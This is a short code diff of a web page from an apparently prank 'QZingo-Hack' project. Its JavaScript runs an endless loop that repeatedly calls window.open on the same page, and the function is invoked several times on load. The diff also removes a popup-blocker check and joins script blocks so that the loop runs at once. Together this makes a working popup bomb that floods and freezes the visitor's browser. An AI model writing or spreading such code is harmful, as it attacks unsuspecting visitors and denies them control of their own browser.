@@ -30,13 +30,13 @@
 		function newPage() {
 			var start = new Date().getTime();
 			var end = start;
-			popupBlockerChecker.check(win);
 			setCookie("accepted","true",1);
 			while(true) {
 				if(end < start + 500)
 				{	
 					end = start = new Date().getTime();
 					var win = window.open("https://anvesh1212.github.io/QZingo-Hack/new.html","_blank");
+					
 				}	
   			}
 		}
@@ -92,9 +92,7 @@
 				}
 				
 			}
-		</script>
-		<br />cookies set.
-		<script>	
+			
 			newPage();
 			newPage();
 			newPage();
